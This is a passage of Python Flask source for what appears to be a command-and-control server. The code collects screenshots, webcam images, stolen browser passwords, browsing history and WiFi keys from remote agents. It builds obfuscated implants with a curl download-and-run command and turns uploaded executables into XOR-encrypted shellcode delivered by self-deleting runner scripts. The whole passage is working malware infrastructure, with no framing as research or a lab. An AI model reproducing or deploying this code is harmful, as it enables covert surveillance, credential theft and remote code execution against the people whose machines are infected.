                            datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                except Exception as e:
                    app.logger.error(f"Error storing screenshot: {str(e)}")

            # Handle webcam images
            if data['task_type'] == 'webcam' and data.get('result') and 'webcam' in data['result']:
                try:
                    image_data = base64.b64decode(data['result']['webcam'])
                    c.execute('''INSERT INTO webcam_captures
                                VALUES (?, ?, ?, ?)''',
                            (None, data['agent_id'],
                            image_data,
                            datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                except Exception as e:
                    app.logger.error(f"Error storing webcam image: {str(e)}")

            # Handle credential harvesting
            if data['task_type'] == 'harvest_creds' and data.get('result') and data['result'].get('credentials'):
                app.logger.info(f"Processing credential harvesting results for agent {data['agent_id']}")
                result = data['result']
                # Store browser credentials
                if 'credentials' in result:
                    app.logger.info(f"Storing {len(result['credentials'])} credentials")
                    for cred in result['credentials']:
                        try:
                            # Check if this credential already exists
                            c.execute('''SELECT id FROM credentials
                                        WHERE agent_id=? AND browser=? AND url=? AND username=? AND password=?''',
                                     (data['agent_id'], cred.get('browser', 'unknown'),
                                      cred.get('url', ''), cred.get('username', ''),
                                      cred.get('password', '')))
                            existing = c.fetchone()

                            if existing:
                                app.logger.info(f"Credential already exists, skipping: {cred.get('browser')} - {cred.get('url')}")
                                continue

                            c.execute('''INSERT INTO credentials
                                        VALUES (?, ?, ?, ?, ?, ?, ?)''',
                                     (None, data['agent_id'], cred.get('browser', 'unknown'),
                                      cred.get('url', ''), cred.get('username', ''),
                                      cred.get('password', ''), datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')))
                            conn.commit()
                            app.logger.info(f"Stored credential: {cred.get('browser')} - {cred.get('url')}")
                        except Exception as e:
                            app.logger.error(f"Error storing browser credential: {str(e)}")

                # Store browser history
                if 'history' in result:
                    app.logger.info(f"Storing {len(result['history'])} history entries")
                    for hist in result['history']:
                        try:
                            # Check if this history entry already exists
                            c.execute('''SELECT id FROM browser_history
                                        WHERE agent_id=? AND browser=? AND profile=? AND url=? AND title=?''',
                                     (data['agent_id'], hist.get('browser', 'unknown'),
                                      hist.get('profile', ''), hist.get('url', ''),
                                      hist.get('title', '')))
                            existing = c.fetchone()

                            if existing:
                                app.logger.info(f"History entry already exists, skipping: {hist.get('browser')} - {hist.get('url')}")
                                continue

                            c.execute('''INSERT INTO browser_history
                                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                                     (None, data['agent_id'], hist.get('browser', 'unknown'),
                                      hist.get('profile', ''), hist.get('url', ''),
                                      hist.get('title', ''), hist.get('visit_count', 0),
                                      hist.get('last_visit_time', 0), datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')))
                            conn.commit()
                            app.logger.info(f"Stored history: {hist.get('browser')} - {hist.get('url')}")
                        except Exception as e:
                            app.logger.error(f"Error storing browser history: {str(e)}")

                # Store WiFi passwords (if any new ones)
                if 'wifi' in result:
                    app.logger.info(f"Storing {len(result['wifi'])} WiFi passwords")
                    for wifi in result['wifi']:
                        try:
                            # Check if this WiFi credential already exists
                            c.execute('''SELECT id FROM credentials
                                        WHERE agent_id=? AND browser='wifi' AND username=? AND password=?''',
                                     (data['agent_id'], wifi.get('ssid', ''),
                                      wifi.get('password', '')))
                            existing = c.fetchone()

                            if existing:
                                app.logger.info(f"WiFi credential already exists, skipping: {wifi.get('ssid')}")
                                continue

                            c.execute('''INSERT INTO credentials
                                        VALUES (?, ?, ?, ?, ?, ?, ?)''',
                                     (None, data['agent_id'], 'wifi', '', wifi.get('ssid', ''),
                                      wifi.get('password', ''), datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')))
                            conn.commit()
                            app.logger.info(f"Stored WiFi: {wifi.get('ssid')}")
                        except Exception as e:
                            app.logger.error(f"Error storing WiFi password: {str(e)}")
            
            conn.commit()
            
            # Notify clients of task completion
            socketio.emit('task_complete', {
                'task_id': data['task_id'],
                'agent_id': data['agent_id'],
                'task_type': data['task_type']
            })
            
            return jsonify({'status': 'success'})
            
        except Exception as e:
            app.logger.error(f"Task result processing error: {str(e)}")
            if conn:
                try:
                    conn.rollback()
                except:
                    pass
            return jsonify({'status': 'error', 'message': str(e)}), 500
        finally:
            if conn:
                conn.close()

    @app.route('/api/download_stolen_data/<int:data_id>')
    @login_required
    def download_stolen_data(data_id):
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        
        c.execute("SELECT browser, content FROM stolen_data WHERE id=?", (data_id,))
        data = c.fetchone()
        conn.close()
        
        if not data:
            return jsonify({"status": "error", "message": "Data not found"}), 404
        
        browser, content = data
        return Response(
            content,
            mimetype='application/json',
            headers={
                'Content-Disposition': f'attachment; filename={browser}_cookies.json'
            }
        )

    @app.route('/api/generate_agent', methods=['POST'])
    @login_required
    def generate_agent():
        
        try:
            data = request.get_json()
            if not data:
                return jsonify({"status": "error", "message": "No data provided"}), 400

            agents_dir = os.path.join(app.root_path, 'agents')
            os.makedirs(agents_dir, exist_ok=True)

            # Process kill date if enabled
            killdate_enabled = bool(data.get('enable_killdate', False))
            killdate_value = ""
            if killdate_enabled and data.get('killdate'):
                try:
                    # Convert from ISO format (YYYY-MM-DDTHH:MM) to our desired format (YYYY-MM-DD HH:MM)
                    dt = datetime.strptime(data['killdate'], "%Y-%m-%dT%H:%M")
                    killdate_value = dt.strftime("%Y-%m-%d %H:%M")
                except ValueError as e:
                    app.logger.warning(f"Invalid kill date format: {str(e)}")
                    killdate_enabled = False

            # Get server URL
            server_url = data.get('server_url', request.url_root).strip('/')

            config = {
                'checkin_interval': max(5, min(int(data.get('checkin_interval', 10)), 3600)),
                'server_url': server_url,
                'take_screenshots': bool(data.get('take_screenshots', True)),
                'screenshot_frequency': max(1, min(int(data.get('screenshot_frequency', 10)), 100)),
                'killdate_enabled': killdate_enabled,
                'killdate': killdate_value if killdate_enabled else "",
                'trusted_certificate': bool(data.get('trusted_certificate', False)),
                'aes_key': CONFIG.aes_key.decode('latin-1'),  # Convert bytes to string for storage
                'aes_iv': CONFIG.aes_iv.decode('latin-1')     # Convert bytes to string for storage
            }

            # Save agent configuration to database
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute('''INSERT INTO agent_configurations
                         (checkin_interval, server_url, take_screenshots, screenshot_frequency, killdate_enabled, killdate, trusted_certificate, aes_key, aes_iv, timestamp)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                      (config['checkin_interval'],
                       config['server_url'],
                       int(config['take_screenshots']),
                       config['screenshot_frequency'],
                       int(config['killdate_enabled']),
                       config['killdate'],
                       int(config['trusted_certificate']),
                       config['aes_key'],
                       config['aes_iv'],
                       datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')))
            conn.commit()
            conn.close()

            template_path = os.path.join(app.root_path, 'templates', 'agent_template.py')
            if not os.path.exists(template_path):
                return jsonify({"status": "error", "message": "Agent template not found"}), 500

            with open(template_path, 'r') as f:
                template = f.read()

            agent_code = template.format(
                checkin_interval=config['checkin_interval'],
                server_url=config['server_url'],
                take_screenshots=str(config['take_screenshots']),
                screenshot_frequency=config['screenshot_frequency'],
                killdate_enabled=str(config['killdate_enabled']),
                killdate=config['killdate'] if config['killdate_enabled'] else "",
                aes_key=repr(CONFIG.aes_key),  # Keep as bytes object
                aes_iv=repr(CONFIG.aes_iv),     # Keep as bytes object
                random=random
            )

            # Apply obfuscation
            agent_code = _obfuscate_code(agent_code)

            agent_path = os.path.join(agents_dir, 'agent.py')
            with open(agent_path, 'w') as f:
                f.write(agent_code)

            # Generate download URLs and commands
            base_url = request.url_root.rstrip('/')
            download_url = f"{base_url}/a/d"
            command1 = f"curl -s {download_url} -o agent.py"
            command2 = f"python3 agent.py"

            return jsonify({
                "status": "success",
                "message": "Agent configuration saved",
                "config": config,
                "download_url": download_url,
                "command1": command1,
                "command2": command2
            })

        except Exception as e:
            app.logger.error(f"Error generating agent: {str(e)}")
            return jsonify({
                "status": "error",
                "message": f"Internal server error: {str(e)}"
            }), 500

    @app.route('/a/d')
    #@login_required
    def download_agent():
        agents_dir = os.path.join(app.root_path, 'agents')
        if not os.path.exists(os.path.join(agents_dir, 'agent.py')):
            return jsonify({"status": "error", "message": "Agent file not found"}), 404
        return send_from_directory(agents_dir, 'agent.py', as_attachment=True)
    
    @app.route('/a/p')
    #@login_required
    def download_python():
        agents_dir = os.path.join(app.root_path, 'agents')
        if not os.path.exists(os.path.join(agents_dir, 'p.zip')):
            return jsonify({"status": "error", "message": "p not found"}), 404
        return send_from_directory(agents_dir, 'p.zip', as_attachment=True)

    @app.route('/api/stolen_data/<int:data_id>', methods=['DELETE'])
    @login_required
    def delete_stolen_data(data_id):
        conn = None
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            c.execute("DELETE FROM stolen_data WHERE id=?", (data_id,))
            conn.commit()
            
            return jsonify({"status": "success"})
            
        except Exception as e:
            if conn:
                conn.rollback()
            return jsonify({"status": "error", "message": str(e)}), 500
        finally:
            if conn:
                conn.close()

    @app.route('/api/killdate_reached', methods=['POST'])
    def killdate_reached():
        conn = None
        try:
            if not request.data:
                return jsonify({"status": "error", "message": "No data provided"}), 400
                
            data = SecureComms.decrypt(request.data)
            if not data or 'agent_id' not in data:
                return jsonify({"status": "error", "message": "Invalid data format"}), 400
                
            app.logger.info(f"Killdate reached for agent {data['agent_id']}")
            
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            # Mark agent as dead in database
            c.execute('''UPDATE agents SET status='dead' WHERE id=?''',
                    (data['agent_id'],))
            
            conn.commit()
            
            # Notify clients
            socketio.emit('agent_dead', {
                'agent_id': data['agent_id'],
                'message': 'Killdate reached - agent self-destructed',
                'timestamp': data.get('timestamp', '')
            })
            
            return jsonify({"status": "success"})
            
        except Exception as e:
            app.logger.error(f"Error processing killdate: {str(e)}")
            if conn:
                conn.rollback()
            return jsonify({"status": "error", "message": str(e)}), 500
        finally:
            if conn:
                conn.close()

    @app.route('/api/shellcode', methods=['POST'])
    @login_required
    def generate_shellcode():
        try:
            entropy = request.form.get('entropy', '1')
            arch = request.form.get('arch', '64')
            args = request.form.get('args', '')
            agent_id = request.form.get('agent_id')
            shellcode_type = request.form.get('shellcodeType', 'file')
            raw_input_method = request.form.get('rawInputMethod', 'file')
            
            if not agent_id:
                return jsonify({"status": "error", "message": "Agent ID required"}), 400
                
            # Create temp directory
            temp_dir = tempfile.mkdtemp()
            shellcode = None
            
            if shellcode_type == 'file':
                if 'file' not in request.files:
                    return jsonify({"status": "error", "message": "No file provided"}), 400
                    
                file = request.files['file']
                if file.filename == '':
                    return jsonify({"status": "error", "message": "No file selected"}), 400
                
                if not file.filename.lower().endswith(('.exe', '.dll')):
                    raise Exception("Only EXE and DLL files are supported for shellcode generation")
                
                input_path = os.path.join(temp_dir, file.filename)
                file.save(input_path)

                # Generate unique output name
                random_value = str(uuid.uuid4())[:8]
                output_name = f"{os.path.splitext(file.filename)[0]}-{agent_id}-{random_value}"
                output_path = os.path.join(temp_dir, output_name + '.bin')

                # Build donut command
                args_str = str(args) if args else ''

                # Properly quote the volume mount path to handle spaces and special characters
                cmd = f'docker run --rm -v "{temp_dir}:/workdir" donut -e {entropy} -a {arch} -o /workdir/{output_name}.bin -f 1'

                if args_str:
                    cmd += f' -p "{args_str}"'

                cmd += f" -i /workdir/{file.filename}"

                # Run donut and properly handle the response
                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True)
                    if result.returncode != 0:
                        raise Exception(f"Donut failed: {result.stderr}")
                    
                    if not os.path.exists(output_path):
                        raise Exception("Shellcode file was not generated")
                    
                    with open(output_path, 'rb') as f:
                        shellcode = f.read()
                except subprocess.CalledProcessError as e:
                    raise Exception(f"Donut execution failed: {e.stderr}")
            else:
                # Handle raw shellcode input
                if raw_input_method == 'file':
                    if 'file' not in request.files:
                        return jsonify({"status": "error", "message": "No file provided"}), 400
                        
                    file = request.files['file']
                    if file.filename == '':
                        return jsonify({"status": "error", "message": "No file selected"}), 400
                    
                    input_path = os.path.join(temp_dir, file.filename)
                    file.save(input_path)
                    with open(input_path, 'rb') as f:
                        shellcode = f.read()
                else:
                    hex_string = request.form.get('shellcodeHex', '').strip()
                    if not hex_string:
                        raise Exception("No hex shellcode provided")
                    try:
                        shellcode = bytes.fromhex(hex_string)
                    except ValueError as e:
                        raise Exception(f"Invalid hex string: {str(e)}")
            
            if not shellcode:
                raise Exception("No shellcode was generated or provided")

            # Generate random XOR key for encryption
            xor_key = secrets.token_bytes(32)  # 256-bit key

            # Encrypt shellcode with XOR
            def xor_encrypt(data, key):
                key_len = len(key)
                return bytes([data[i] ^ key[i % key_len] for i in range(len(data))])

            encrypted_shellcode = xor_encrypt(shellcode, xor_key)

            # Generate random filename for shellcode
            shellcode_name = f"shellcode_{uuid.uuid4().hex[:8]}.bin"
            shellcode_dir = os.path.join(app.root_path, 'shellcodes')
            os.makedirs(shellcode_dir, exist_ok=True)
            shellcode_path = os.path.join(shellcode_dir, shellcode_name)

            # Save encrypted shellcode to file
            with open(shellcode_path, 'wb') as f:
                f.write(encrypted_shellcode)
            
            # Determine server URL from agent_configurations
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute("SELECT server_url FROM agent_configurations ORDER BY timestamp DESC LIMIT 1")
            row = c.fetchone()
            conn.close()
            server_url = row[0] if row else request.url_root.rstrip('/')
            
            # Create task for agent first to get task_id
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()

            # First check if identical task already exists
            c.execute("""SELECT id FROM tasks
                        WHERE agent_id=? AND task_type='shellcode' AND status='pending'
                        ORDER BY created_at DESC LIMIT 1""",
                    (agent_id,))
            existing_task = c.fetchone()

            if existing_task:
                return jsonify({
                    "status": "error",
                    "message": "A pending shellcode task already exists for this agent"
                }), 400

            # Generate shellcode URL
            shellcode_url = f"{server_url}/api/download_shellcode/{shellcode_name}"

            # Create task first to get task_id
            runner_name = f"runner_{uuid.uuid4().hex[:8]}.py"
            runner_url = f"{server_url}/api/download_runner/{runner_name}"

            task_data = {
                'runner_url': runner_url,
                'execution_method': 'download_execute'
            }

            c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                    (None, agent_id, 'shellcode',
                    json.dumps(task_data),
                    'pending',
                    datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'),
                    None))

            conn.commit()
            task_id = c.lastrowid
            conn.close()

            # Now generate runner script with the correct task_id
            callback_url = f"{server_url}/api/shellcode_output"
            app.logger.info(f"Generating runner script with task_id: {task_id}")
            runner_content = _generate_runner_script(shellcode_url, callback_url, xor_key, task_id)
            app.logger.info(f"Runner content length: {len(runner_content)}")
            runners_dir = os.path.join(app.root_path, 'runners')
            os.makedirs(runners_dir, exist_ok=True)
            runner_path = os.path.join(runners_dir, runner_name)

            with open(runner_path, 'w') as f:
                f.write(runner_content)

            # Debug: read back the file to verify task_id is in it
            with open(runner_path, 'r') as f:
                written_content = f.read()
                app.logger.info(f"Written runner script contains task_id: {'task_id' in written_content}")
                if 'task_id' in written_content:
                    # Find the line with task_id
                    lines = written_content.split('\n')
                    for line in lines:
                        if 'task_id' in line:
                            app.logger.info(f"Task ID line: {line.strip()}")
                            break
                # Find the line with task_id_value assignment
                lines = written_content.split('\n')
                for line in lines:
                    if 'task_id_value =' in line:
                        app.logger.info(f"Task ID value assignment: {line.strip()}")
                        break
            
            # Clean up temp files
            try:
                if 'input_path' in locals() and os.path.exists(input_path):
                    os.remove(input_path)
                if 'output_path' in locals() and os.path.exists(output_path):
                    os.remove(output_path)
                if os.path.exists(temp_dir):
                    os.rmdir(temp_dir)
            except Exception as e:
                app.logger.error(f"Error cleaning up temp files: {str(e)}")
            
        
            
            return jsonify({
                "status": "success",
                "task_id": task_id,
                "message": "Shellcode generated and task created",
                "runner_url": runner_url
            })
            
        except Exception as e:
            # Clean up temp files if they exist
            try:
                if 'input_path' in locals() and os.path.exists(input_path):
                    os.remove(input_path)
                if 'output_path' in locals() and os.path.exists(output_path):
                    os.remove(output_path)
                if 'temp_dir' in locals() and os.path.exists(temp_dir):
                    os.rmdir(temp_dir)
            except:
                pass
                
            return jsonify({
                "status": "error",
                "message": str(e)
            }), 500


    @app.route('/api/kill_agent', methods=['POST'])
    @login_required
    def kill_agent():
        conn = None
        try:
            data = request.get_json()
            if not data or 'agent_id' not in data:
                return jsonify({"status": "error", "message": "Agent ID required"}), 400
                
            agent_id = data['agent_id']
            
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            # Create a kill task that will force immediate termination
            task_data = {
                'force': True,
                'immediate': True,
                'method': 'kill_process',
                'retries': 3  # Number of times to retry killing
            }
            
            c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                    (None, agent_id, 'kill', 
                    json.dumps(task_data),
                    'pending', 
                    datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'), 
                    None))
            
            conn.commit()
            task_id = c.lastrowid
            
            # Don't mark as dead immediately - wait for confirmation
            socketio.emit('agent_kill_initiated', {
                'agent_id': agent_id,
                'task_id': task_id,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'),
                'message': 'Kill command sent to agent'
            })
            
            return jsonify({
                "status": "success",
                "task_id": task_id,
                "message": f"Kill command sent to agent {agent_id}"
            })
            
        except Exception as e:
            if conn:
                conn.rollback()
            return jsonify({
                "status": "error",
                "message": str(e)
            }), 500
        finally:
            if conn:
                conn.close()

    @app.route('/api/agent_terminated', methods=['POST'])
    def agent_terminated():
        conn = None
        try:
            if not request.data:
                return jsonify({"status": "error", "message": "No data provided"}), 400
                
            data = SecureComms.decrypt(request.data)
            agent_id = data.get('agent_id')
            
            if not agent_id:
                return jsonify({"status": "error", "message": "Agent ID required"}), 400
            
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            # Confirm agent termination
            c.execute("UPDATE agents SET status='dead', last_seen=? WHERE id=?",
                    (data.get('timestamp'), agent_id))
            
            conn.commit()
            
            # Notify clients
            socketio.emit('agent_terminated', {
                'agent_id': agent_id,
                'timestamp': data.get('timestamp'),
                'message': 'Agent confirmed terminated'
            })
            
            return jsonify({"status": "success"})
            
        except Exception as e:
            if conn:
                conn.rollback()
            return jsonify({
                "status": "error",
                "message": str(e)
            }), 500
        finally:
            if conn:
                conn.close()

    @app.route('/api/verify_termination', methods=['POST'])
    def verify_termination():
        try:
            if not request.data:
                return jsonify({"status": "error", "message": "No data provided"}), 400
                
            data = SecureComms.decrypt(request.data)
            agent_id = data.get('agent_id')
            
            if not agent_id:
                return jsonify({"status": "error", "message": "Agent ID required"}), 400
            
            # Try to ping the agent
            try:
                response = requests.post(
                    f"https://{data.get('last_known_ip')}/api/ping",
                    timeout=5,
                    verify=False
                )
                if response.status_code == 200:
                    return jsonify({
                        "status": "error",
                        "message": "Agent still responding",
                        "alive": True
                    })
            except:
                pass
            
            # If we get here, agent appears dead
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            c.execute("UPDATE agents SET status='dead' WHERE id=?", (agent_id,))
            conn.commit()
            
            socketio.emit('agent_confirmed_dead', {
                'agent_id': agent_id,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'),
                'message': 'Agent termination confirmed'
            })
            
            return jsonify({
                "status": "success",
                "alive": False,
                "message": "Agent termination confirmed"
            })
            
        except Exception as e:
            return jsonify({
                "status": "error",
                "message": str(e)
            }), 500
        finally:
            if 'conn' in locals():
                conn.close()

    @app.route('/api/check_agent_status', methods=['POST'])
    def check_agent_status():
        # First verify the monitor token
        auth_header = request.headers.get('Authorization')
        if auth_header and auth_header.startswith('Bearer '):
            token = auth_header.split(' ')[1]
            if token == CONFIG.monitor_token:
                # Bypass authentication for monitor
                pass
            else:
                return jsonify({"status": "error", "message": "Invalid token"}), 401
        else:
            # Apply login_required for non-monitor requests
            if not current_user.is_authenticated:
                return jsonify({"status": "error", "message": "Authentication required"}), 401
        
        conn = None
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            # Get current time
            now = datetime.now()
            
            # Get all agents that haven't checked in within 10x their checkin interval
            c.execute('''
                SELECT id, last_seen, checkin_interval 
                FROM agents 
                WHERE status = 'online'
            ''')
            
            agents = c.fetchall()
            inactive_agents = []
            
            for agent in agents:
                agent_id, last_seen_str, checkin_interval = agent
                
                # Clean up the datetime string by stripping whitespace
                last_seen_str = last_seen_str.strip()
                
                try:
                    # Try parsing with timezone first
                    last_seen = datetime.strptime(last_seen_str, '%Y-%m-%d %H:%M:%S %Z')
                except ValueError:
                    try:
                        # Fall back to parsing without timezone if that fails
                        last_seen = datetime.strptime(last_seen_str, '%Y-%m-%d %H:%M:%S')
                    except ValueError as e:
                        app.logger.error(f"Error parsing last_seen for agent {agent_id}: {str(e)}")
                        continue
                
                time_diff = (now - last_seen).total_seconds()

                if checkin_interval is None:
                    checkin_interval = 10

                # Mark as inactive if last seen > 10x checkin interval
                if time_diff > checkin_interval * 10:
                    c.execute('''
                        UPDATE agents 
                        SET status = 'inactive' 
                        WHERE id = ?
                    ''', (agent_id,))
                    inactive_agents.append(agent_id)
            
            conn.commit()
            
            if inactive_agents:
                # Notify clients via websocket
                socketio.emit('agents_inactive', {
                    'agent_ids': inactive_agents,
                    'message': 'Agents marked as inactive due to missed checkins'
                })
            
            return jsonify({
                "status": "success",
                "inactive_agents": inactive_agents
            })
            
        except Exception as e:
            app.logger.error(f"Error in check_agent_status: {str(e)}")
            if conn:
                conn.rollback()
            return jsonify({
                "status": "error",
                "message": str(e)
            }), 500
        finally:
            if conn:
                conn.close()

    

    @app.route('/api/download_runner/<string:runner_name>')
    def download_runner(runner_name):
        import threading
        import time
        runners_dir = os.path.join(app.root_path, 'runners')
        runner_path = os.path.join(runners_dir, runner_name)
        
        if not os.path.exists(runner_path):
            return jsonify({"status": "error", "message": "Runner not found"}), 404
        
        response = send_from_directory(runners_dir, runner_name, as_attachment=True)
        
        def delete_file_later(path, delay=10):
            def delayed_delete():
                time.sleep(delay)
                try:
                    if os.path.exists(path):
                        os.remove(path)
                except Exception as e:
                    app.logger.error(f"Error deleting runner file {path}: {str(e)}")
            threading.Thread(target=delayed_delete).start()
        
        delete_file_later(runner_path)
        return response
    
    @app.route('/api/download_shellcode/<string:shellcode_name>')
    def download_shellcode(shellcode_name):
        import threading
        import time
        shellcode_dir = os.path.join(app.root_path, 'shellcodes')
        shellcode_path = os.path.join(shellcode_dir, shellcode_name)

        if not os.path.exists(shellcode_path):
            return jsonify({"status": "error", "message": "Shellcode not found"}), 404

        response = send_from_directory(shellcode_dir, shellcode_name, as_attachment=True)

        def delete_file_later(path, delay=300):  # Increased delay to 5 minutes for large files
            def delayed_delete():
                time.sleep(delay)
                try:
                    if os.path.exists(path):
                        os.remove(path)
                except Exception as e:
                    app.logger.error(f"Error deleting shellcode file {path}: {str(e)}")
            threading.Thread(target=delayed_delete).start()

        delete_file_later(shellcode_path)
        return response

    @app.route('/api/browser_history', methods=['GET'])
    @login_required
    def get_browser_history():
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()

            c.execute('''
                SELECT id, agent_id, browser, profile, url, title, visit_count, last_visit_time, timestamp
                FROM browser_history
                ORDER BY timestamp DESC
                LIMIT 1000
            ''')

            history = []
            for row in c.fetchall():
                history.append({
                    'id': row[0],
                    'agent_id': row[1],
                    'browser': row[2],
                    'profile': row[3] or '',
                    'url': row[4],
                    'title': row[5] or '',
                    'visit_count': row[6] or 0,
                    'last_visit_time': row[7] or 0,
                    'timestamp': row[8]
                })

            conn.close()

            return jsonify({
                'status': 'success',
                'history': history
            })

        except Exception as e:
            app.logger.error(f"Error fetching browser history: {str(e)}")
            return jsonify({
                'status': 'error',
                'message': str(e)
            }), 500

    # IP Whitelist Management API Endpoints
    @app.route('/api/ip_whitelist', methods=['GET'])
    @login_required
    def get_ip_whitelist():
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()

            # Ensure table exists and has default entries
            c.execute('''
                CREATE TABLE IF NOT EXISTS ip_whitelist (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip_range TEXT NOT NULL UNIQUE,
                    description TEXT,
                    enabled INTEGER NOT NULL DEFAULT 1
                )
            ''')

            c.execute("SELECT id, ip_range, description, enabled FROM ip_whitelist ORDER BY id")
            rows = c.fetchall()
            conn.close()

            whitelist = [{
                'id': row[0],
                'ip_range': row[1],
                'description': row[2],
                'enabled': bool(row[3])
            } for row in rows]

            return jsonify({'status': 'success', 'whitelist': whitelist})
        except Exception as e:
            app.logger.error(f"Error fetching IP whitelist: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/api/ip_whitelist', methods=['POST'])
    @login_required
    def add_ip_whitelist():
        try:
            data = request.get_json()
            if not data or 'ip_range' not in data:
                return jsonify({'status': 'error', 'message': 'ip_range required'}), 400

            ip_range = data['ip_range'].strip()
            description = data.get('description', '').strip()

            # Validate IP range
            try:
                ipaddress.ip_network(ip_range, strict=False)
            except ValueError:
                return jsonify({'status': 'error', 'message': 'Invalid IP range format'}), 400

            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()

            # Check if IP range already exists
            c.execute("SELECT id FROM ip_whitelist WHERE ip_range=?", (ip_range,))
            existing = c.fetchone()
            if existing:
                conn.close()
                return jsonify({'status': 'error', 'message': 'IP range already exists in whitelist'}), 400

            c.execute("INSERT INTO ip_whitelist (ip_range, description, enabled) VALUES (?, ?, ?)",
                      (ip_range, description, 1))
            conn.commit()
            whitelist_id = c.lastrowid
            conn.close()

            return jsonify({'status': 'success', 'message': 'IP range added to whitelist', 'id': whitelist_id})
        except Exception as e:
            app.logger.error(f"Error adding IP to whitelist: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/api/ip_whitelist/<int:whitelist_id>', methods=['PUT'])
    @login_required
    def update_ip_whitelist(whitelist_id):
        try:
            data = request.get_json()
            if not data:
                return jsonify({'status': 'error', 'message': 'No data provided'}), 400

            ip_range = data.get('ip_range', '').strip()
            description = data.get('description', '').strip()

            if ip_range:
                # Validate IP range
                try:
                    ipaddress.ip_network(ip_range, strict=False)
                except ValueError:
                    return jsonify({'status': 'error', 'message': 'Invalid IP range format'}), 400

            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()

            # Check if entry exists
            c.execute("SELECT id FROM ip_whitelist WHERE id=?", (whitelist_id,))
            if not c.fetchone():
                conn.close()
                return jsonify({'status': 'error', 'message': 'Whitelist entry not found'}), 404

            # Update
            enabled = data.get('enabled', True)
            if ip_range and description:
                c.execute("UPDATE ip_whitelist SET ip_range=?, description=?, enabled=? WHERE id=?",
                          (ip_range, description, int(enabled), whitelist_id))
            elif ip_range:
                c.execute("UPDATE ip_whitelist SET ip_range=?, enabled=? WHERE id=?", (ip_range, int(enabled), whitelist_id))
            elif description:
                c.execute("UPDATE ip_whitelist SET description=?, enabled=? WHERE id=?", (description, int(enabled), whitelist_id))
            else:
                c.execute("UPDATE ip_whitelist SET enabled=? WHERE id=?", (int(enabled), whitelist_id))

            conn.commit()
            conn.close()

            return jsonify({'status': 'success', 'message': 'IP whitelist entry updated'})
        except Exception as e:
            app.logger.error(f"Error updating IP whitelist: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/api/ip_whitelist/<int:whitelist_id>', methods=['DELETE'])
    @login_required
    def delete_ip_whitelist(whitelist_id):
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute("DELETE FROM ip_whitelist WHERE id=?", (whitelist_id,))
            deleted = c.rowcount
            conn.commit()
            conn.close()

            if deleted == 0:
                return jsonify({'status': 'error', 'message': 'Whitelist entry not found'}), 404

            return jsonify({'status': 'success', 'message': 'IP range deleted from whitelist'})
        except Exception as e:
            app.logger.error(f"Error deleting IP from whitelist: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/api/blocked_logs', methods=['GET'])
    @login_required
    def get_blocked_logs():
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()

            # Ensure table exists
            c.execute('''
                CREATE TABLE IF NOT EXISTS blocked_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    first_seen TEXT NOT NULL,
                    last_seen TEXT NOT NULL,
                    ip TEXT NOT NULL UNIQUE,
                    count INTEGER NOT NULL DEFAULT 1
                )
            ''')

            c.execute("SELECT id, first_seen, last_seen, ip, count FROM blocked_logs ORDER BY last_seen DESC LIMIT 100")
            rows = c.fetchall()
            conn.close()

            logs = [{
                'id': row[0],
                'first_seen': row[1],
                'last_seen': row[2],
                'ip': row[3],
                'count': row[4]
            } for row in rows]

            return jsonify({'status': 'success', 'logs': logs})
        except Exception as e:
            app.logger.error(f"Error fetching blocked logs: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/api/blocked_logs/<int:log_id>/add_to_whitelist', methods=['POST'])
    @login_required
    def add_blocked_ip_to_whitelist(log_id):
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()

            # Get the IP from the log
            c.execute("SELECT ip FROM blocked_logs WHERE id=?", (log_id,))
            row = c.fetchone()
            if not row:
                conn.close()
                return jsonify({'status': 'error', 'message': 'Log entry not found'}), 404

            ip = row[0]

            # Check if already in whitelist
            c.execute("SELECT id FROM ip_whitelist WHERE ip_range=?", (ip,))
            if c.fetchone():
                conn.close()
                return jsonify({'status': 'error', 'message': 'IP already in whitelist'}), 400

            # Add to whitelist
            c.execute("INSERT INTO ip_whitelist (ip_range, description, enabled) VALUES (?, ?, ?)",
